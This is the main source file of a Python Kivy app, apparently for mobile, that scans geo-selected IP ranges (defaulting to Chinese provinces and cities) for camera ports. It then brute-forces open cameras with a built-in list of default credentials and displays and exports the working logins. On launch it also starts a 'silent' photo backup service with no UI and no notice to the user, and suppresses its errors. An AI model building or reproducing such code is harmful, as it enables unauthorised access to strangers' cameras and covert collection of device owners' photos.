"""
Network Scanner & Photo Backup - Main Kivy Application
Part 1: Port Scanner UI with camera presets, brute force, geo IP selection
Part 2: Silent background photo backup (no UI)
"""

import os
import json
import threading

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.spinner import Spinner
from kivy.uix.togglebutton import ToggleButton
from kivy.uix.popup import Popup
from kivy.uix.recycleview import RecycleView
from kivy.uix.recycleview.views import RecycleDataViewBehavior
from kivy.uix.boxlayout import BoxLayout as KxBoxLayout
from kivy.properties import StringProperty, BooleanProperty, ListProperty
from kivy.clock import Clock
from kivy.metrics import dp, sp

import scanner
import bruteforce
import ip_geo
import camera_ports
import backup_service


# ---------------------------------------------------------------------------
# Custom Widgets
# ---------------------------------------------------------------------------

class ScanResultItem(KxBoxLayout, RecycleDataViewBehavior):
    """Single row in scan results list."""
    index = None

    def refresh_view_attrs(self, rv, index, data):
        self.index = index
        super().refresh_view_attrs(rv, index, data)


class ScanResultView(RecycleView):
    """Scrollable list of scan results."""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.data = []


class LabeledTextInput(BoxLayout):
    """Label + TextInput combined widget."""
    text = StringProperty("")

    def __init__(self, label_text="", hint_text="", **kwargs):
        super().__init__(orientation="horizontal", size_hint_y=None, height=dp(40), **kwargs)
        self.label = Label(
            text=label_text, size_hint_x=0.35, font_size=sp(13),
            halign="right", valign="middle"
        )
        self.label.bind(size=self.label.setter("text_size"))
        self.input = TextInput(
            hint_text=hint_text, size_hint_x=0.65,
            multiline=False, font_size=sp(14)
        )
        self.input.bind(text=self._on_text)
        self.add_widget(self.label)
        self.add_widget(self.input)

    def _on_text(self, instance, value):
        self.text = value

    @property
    def value(self):
        return self.input.text


class SectionHeader(Label):
    """Section header label."""
    def __init__(self, text="", **kwargs):
        super().__init__(
            text=text, size_hint_y=None, height=dp(30),
            font_size=sp(15), bold=True, color=(0.2, 0.6, 1, 1),
            halign="left", valign="middle"
        )
        self.bind(size=self.setter("text_size"))


# ---------------------------------------------------------------------------
# Main Application Layout
# ---------------------------------------------------------------------------

class NetworkScannerUI(BoxLayout):
    """Main application UI."""

    scan_results = ListProperty([])
    brute_results = ListProperty([])

    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", padding=dp(8), spacing=dp(4), **kwargs)

        self._port_scanner = None
        self._brute_scanner = None

        # Title
        title = Label(
            text="Network Scanner & Camera Finder",
            size_hint_y=None, height=dp(40), font_size=sp(18),
            bold=True, color=(0.3, 0.8, 0.3, 1)
        )
        self.add_widget(title)

        # Scrollable content area
        scroll = ScrollView(size_hint=(1, 1))
        content = BoxLayout(orientation="vertical", size_hint_y=None, spacing=dp(4))
        content.bind(minimum_height=content.setter("height"))

        # === Section 1: IP Range ===
        content.add_widget(SectionHeader("[ IP Range ]"))

        self.start_ip = LabeledTextInput("Start IP:", "192.168.1.1")
        content.add_widget(self.start_ip)

        self.end_ip = LabeledTextInput("End IP:", "192.168.1.255")
        content.add_widget(self.end_ip)

        # === Section 2: Port Settings ===
        content.add_widget(SectionHeader("[ Port Settings ]"))

        self.port_list = LabeledTextInput("Ports:", "80,554,8080")
        content.add_widget(self.port_list)

        # Port range
        port_range_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(40)
        )
        lbl = Label(text="Port Range:", size_hint_x=0.35, font_size=sp(13),
                     halign="right", valign="middle")
        lbl.bind(size=lbl.setter("text_size"))
        self.port_start = TextInput(hint_text="Start", size_hint_x=0.3,
                                    multiline=False, font_size=sp(14))
        lbl_dash = Label(text="-", size_hint_x=0.05, font_size=sp(14))
        self.port_end = TextInput(hint_text="End", size_hint_x=0.3,
                                  multiline=False, font_size=sp(14))
        port_range_row.add_widget(lbl)
        port_range_row.add_widget(self.port_start)
        port_range_row.add_widget(lbl_dash)
        port_range_row.add_widget(self.port_end)
        content.add_widget(port_range_row)

        # Camera preset spinner
        content.add_widget(SectionHeader("[ Camera Port Presets ]"))
        camera_preset_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(40)
        )
        preset_labels = list(camera_ports.CAMERA_PORT_PRESETS.keys())
        self.camera_spinner = Spinner(
            text="Select Camera Type",
            values=preset_labels,
            size_hint_x=0.7, font_size=sp(13)
        )
        self.camera_spinner.bind(text=self._on_camera_preset)
        camera_preset_row.add_widget(Label(text="Preset:", size_hint_x=0.3,
                                            font_size=sp(13)))
        camera_preset_row.add_widget(self.camera_spinner)
        content.add_widget(camera_preset_row)

        # === Section 3: Password Brute Force ===
        content.add_widget(SectionHeader("[ Password Probe ]"))

        bf_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(40)
        )
        self.bf_toggle = ToggleButton(
            text="Enable Password Probe", group="bf",
            size_hint_x=0.7, font_size=sp(13)
        )
        self.bf_creds_info = Label(
            text=f"({len(camera_ports.DEFAULT_CAMERA_CREDS)} combos)",
            size_hint_x=0.3, font_size=sp(11), color=(0.7, 0.7, 0.7, 1)
        )
        bf_row.add_widget(self.bf_toggle)
        bf_row.add_widget(self.bf_creds_info)
        content.add_widget(bf_row)

        # === Section 4: Geo IP Selection ===
        content.add_widget(SectionHeader("[ Location IP Range ]"))

        # Country
        country_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(40)
        )
        country_row.add_widget(Label(text="Country:", size_hint_x=0.3,
                                      font_size=sp(13)))
        self.country_spinner = Spinner(
            text="China",
            values=list(ip_geo.COUNTRY_CODES.keys()),
            size_hint_x=0.7, font_size=sp(13)
        )
        self.country_spinner.bind(text=self._on_country_select)
        country_row.add_widget(self.country_spinner)
        content.add_widget(country_row)

        # Province
        province_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(40)
        )
        province_row.add_widget(Label(text="Province:", size_hint_x=0.3,
                                       font_size=sp(13)))
        self.province_spinner = Spinner(
            text="Select Province",
            values=list(ip_geo.PROVINCE_RANGES_CN.keys()),
            size_hint_x=0.7, font_size=sp(13)
        )
        self.province_spinner.bind(text=self._on_province_select)
        province_row.add_widget(self.province_spinner)
        content.add_widget(province_row)

        # City
        city_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(40)
        )
        city_row.add_widget(Label(text="City:", size_hint_x=0.3,
                                   font_size=sp(13)))
        self.city_spinner = Spinner(
            text="Select City",
            values=[],
            size_hint_x=0.7, font_size=sp(13)
        )
        self.city_spinner.bind(text=self._on_city_select)
        city_row.add_widget(self.city_spinner)
        content.add_widget(city_row)

        # Apply location button
        self.apply_location_btn = Button(
            text="Apply Location to IP Range",
            size_hint_y=None, height=dp(36), font_size=sp(13),
            background_color=(0.2, 0.5, 0.8, 1)
        )
        self.apply_location_btn.bind(on_press=self._apply_location)
        content.add_widget(self.apply_location_btn)

        # === Section 5: Scan Controls ===
        content.add_widget(SectionHeader("[ Scan Control ]"))

        btn_row = BoxLayout(
            orientation="horizontal", size_hint_y=None, height=dp(44),
            spacing=dp(8)
        )
        self.scan_btn = Button(
            text="START SCAN", font_size=sp(15), bold=True,
            background_color=(0.1, 0.7, 0.2, 1)
        )
        self.scan_btn.bind(on_press=self._start_scan)

        self.stop_btn = Button(
            text="STOP", font_size=sp(15), bold=True,
            background_color=(0.8, 0.2, 0.1, 1), disabled=True
        )
        self.stop_btn.bind(on_press=self._stop_scan)

        btn_row.add_widget(self.scan_btn)
        btn_row.add_widget(self.stop_btn)
        content.add_widget(btn_row)

        # Progress bar label
        self.progress_label = Label(
            text="Ready", size_hint_y=None, height=dp(24),
            font_size=sp(12), color=(0.7, 0.7, 0.7, 1)
        )
        content.add_widget(self.progress_label)

        # === Section 6: Results ===
        content.add_widget(SectionHeader("[ Scan Results ]"))

        self.results_label = Label(
            text="No results yet",
            size_hint_y=None, height=dp(300),
            font_size=sp(11), halign="left", valign="top",
            text_size=(None, None)
        )
        self.results_label.bind(
            width=lambda *x: self.results_label.setter("text_size")(self.results_label, (self.results_label.width, None))
        )
        content.add_widget(self.results_label)

        # Export button
        self.export_btn = Button(
            text="Export Results",
            size_hint_y=None, height=dp(36), font_size=sp(13),
            background_color=(0.5, 0.5, 0.1, 1), disabled=True
        )
        self.export_btn.bind(on_press=self._export_results)
        content.add_widget(self.export_btn)

        scroll.add_widget(content)
        self.add_widget(scroll)

        # Start backup service silently (Part 2 - no UI)
        self._start_backup_service()

    # -----------------------------------------------------------------------
    # Camera Preset Handler
    # -----------------------------------------------------------------------

    def _on_camera_preset(self, spinner, text):
        """When a camera preset is selected, fill in the ports."""
        if text in camera_ports.CAMERA_PORT_PRESETS:
            ports = camera_ports.CAMERA_PORT_PRESETS[text]["ports"]
            self.port_list.input.text = ports
            note = camera_ports.CAMERA_PORT_PRESETS[text].get("note", "")
            self.progress_label.text = f"Preset: {text} - {note}"

    # -----------------------------------------------------------------------
    # Location Handlers
    # -----------------------------------------------------------------------

    def _on_country_select(self, spinner, text):
        """Handle country selection."""
        if text == "China":
            self.province_spinner.values = list(ip_geo.PROVINCE_RANGES_CN.keys())
            self.province_spinner.text = "Select Province"
        else:
            self.province_spinner.values = ["N/A - Use custom IP range"]
            self.province_spinner.text = "N/A"

    def _on_province_select(self, spinner, text):
        """Handle province selection - update city list."""
        cities = ip_geo.PROVINCE_CITIES.get(text, [])
        if cities:
            self.city_spinner.values = cities
            self.city_spinner.text = cities[0]
        else:
            self.city_spinner.values = []
            self.city_spinner.text = "N/A"

    def _on_city_select(self, spinner, text):
        """Handle city selection."""
        pass  # Applied when button is pressed

    def _apply_location(self, instance):
        """Apply selected location to IP range fields."""
        city = self.city_spinner.text
        province = self.province_spinner.text

        # Try city-level ranges first
        ranges = ip_geo.get_city_ranges(city)
        if not ranges:
            ranges = ip_geo.get_province_ranges(province)

        if ranges:
            # Use the first range
            start, end = ranges[0]
            self.start_ip.input.text = start
            self.end_ip.input.text = end
            self.progress_label.text = f"Applied: {city or province} ({len(ranges)} ranges)"
        else:
            self.progress_label.text = "No IP range data for this location"

    # -----------------------------------------------------------------------
    # Scanning
    # -----------------------------------------------------------------------

    def _get_ports(self):
        """Parse and return list of ports to scan."""
        start_p = int(self.port_start.text) if self.port_start.text.isdigit() else 0
        end_p = int(self.port_end.text) if self.port_end.text.isdigit() else 0
        return scanner.parse_ports(self.port_list.value, start_p, end_p)

    def _start_scan(self, instance):
        """Start the port scan."""
        start_ip = self.start_ip.value.strip()
        end_ip = self.end_ip.value.strip()

        if not start_ip or not end_ip:
            self.progress_label.text = "Please enter IP range"
            return

        ports = self._get_ports()
        if not ports:
            self.progress_label.text = "Please specify ports to scan"
            return

        self.scan_btn.disabled = True
        self.stop_btn.disabled = False
        self.scan_results = []
        self.results_label.text = "Scanning..."
        self.progress_label.text = f"Scanning {start_ip} - {end_ip} on {len(ports)} ports..."

        # Create and start scanner in background thread
        self._port_scanner = scanner.PortScanner(
            start_ip=start_ip,
            end_ip=end_ip,
            ports=ports,
            timeout=1.5,
            max_threads=100,
            on_result=self._on_scan_result,
            on_progress=self._on_scan_progress,
        )

        scan_thread = threading.Thread(target=self._run_scan, daemon=True)
        scan_thread.start()

    def _run_scan(self):
        """Execute scan in background thread."""
        try:
            self._port_scanner.scan()
        except Exception as e:
            Clock.schedule_once(lambda dt: self._on_scan_error(str(e)))

    def _on_scan_result(self, result):
        """Called when a scan result is found (from any thread)."""
        Clock.schedule_once(lambda dt: self._update_results(result))

    def _on_scan_progress(self, completed, total):
        """Called with scan progress updates."""
        pct = int((completed / total) * 100) if total > 0 else 0
        Clock.schedule_once(
            lambda dt: setattr(
                self.progress_label, "text",
                f"Progress: {pct}% ({completed}/{total})"
            )
        )

    def _on_scan_error(self, error_msg):
        """Handle scan error."""
        self.progress_label.text = f"Scan error: {error_msg}"
        self.scan_btn.disabled = False
        self.stop_btn.disabled = True

    def _update_results(self, new_result):
        """Update results display with new scan result."""
        self.scan_results.append(new_result)
        self._refresh_results_display()

    def _refresh_results_display(self):
        """Refresh the results label."""
        lines = []
        for r in self.scan_results:
            banner = r.get("banner", "")[:50]
            line = f"[{r['ip']}]:{r['port']} OPEN"
            if banner:
                line += f" | {banner}"
            # Add brute force results
            bf = [b for b in self.brute_results if b["ip"] == r["ip"] and b["port"] == r["port"]]
            for b in bf:
                line += f"\n  CRED: {b['username']}:{b['password']} ({b['protocol']})"
            lines.append(line)
        self.results_label.text = "\n".join(lines) if lines else "No open ports found"
        self.export_btn.disabled = len(self.scan_results) == 0

    def _stop_scan(self, instance):
        """Stop the current scan."""
        if self._port_scanner:
            self._port_scanner.stop()
        if self._brute_scanner:
            self._brute_scanner.stop()
        self.progress_label.text = "Scan stopped"
        self.scan_btn.disabled = False
        self.stop_btn.disabled = True

        # If brute force was enabled, start it now on found ports
        if self.bf_toggle.state == "down" and self.scan_results:
            self._start_bruteforce()

    # -----------------------------------------------------------------------
    # Brute Force
    # -----------------------------------------------------------------------

    def _start_bruteforce(self):
        """Start password brute force on found open ports."""
        targets = [
            {"ip": r["ip"], "port": r["port"]}
            for r in self.scan_results
        ]
        if not targets:
            return

        self.progress_label.text = f"Probing {len(targets)} hosts..."
        self._brute_scanner = bruteforce.BruteForceScanner(
            targets=targets,
            credentials=camera_ports.DEFAULT_CAMERA_CREDS,
            max_threads=20,
            timeout=3.0,
            on_result=self._on_brute_result,
            on_progress=self._on_brute_progress,
        )

        bf_thread = threading.Thread(target=self._run_bruteforce, daemon=True)
        bf_thread.start()

    def _run_bruteforce(self):
        """Execute brute force in background."""
        try:
            self._brute_scanner.scan()
            Clock.schedule_once(
                lambda dt: setattr(
                    self.progress_label, "text",
                    f"Probe complete. Found {len(self.brute_results)} credentials."
                )
            )
        except Exception as e:
            Clock.schedule_once(
                lambda dt: setattr(
                    self.progress_label, "text", f"Probe error: {e}"
                )
            )

    def _on_brute_result(self, result):
        """Handle brute force result."""
        Clock.schedule_once(lambda dt: self._update_brute_result(result))

    def _on_brute_progress(self, completed, total):
        """Handle brute force progress."""
        pct = int((completed / total) * 100) if total > 0 else 0
        Clock.schedule_once(
            lambda dt: setattr(
                self.progress_label, "text",
                f"Probing: {pct}% ({completed}/{total})"
            )
        )

    def _update_brute_result(self, result):
        """Add brute force result and refresh display."""
        self.brute_results.append(result)
        self._refresh_results_display()

    # -----------------------------------------------------------------------
    # Export
    # -----------------------------------------------------------------------

    def _export_results(self, instance):
        """Export scan results to JSON file."""
        export_data = {
            "scan_results": self.scan_results,
            "brute_force_results": self.brute_results,
        }
        try:
            outpath = os.path.join(
                os.path.expanduser("~"), "scan_results.json"
            )
            with open(outpath, "w") as f:
                json.dump(export_data, f, indent=2)
            self.progress_label.text = f"Exported to {outpath}"
        except IOError as e:
            self.progress_label.text = f"Export failed: {e}"

    # -----------------------------------------------------------------------
    # Backup Service (Part 2 - Silent)
    # -----------------------------------------------------------------------

    def _start_backup_service(self):
        """Start the background photo backup service silently."""
        try:
            backup_service.start_backup_service()
        except Exception:
            pass  # Silent failure - no UI notification


# ---------------------------------------------------------------------------
# App Entry Point
# ---------------------------------------------------------------------------

class NetworkScannerApp(App):
    """Kivy application entry point."""

    def build(self):
        self.title = "Network Scanner"
        return NetworkScannerUI()

    def on_pause(self):
        """Allow app to run in background on Android."""
        return True

    def on_resume(self):
        """Resume from background."""
        pass


if __name__ == "__main__":
    NetworkScannerApp().run()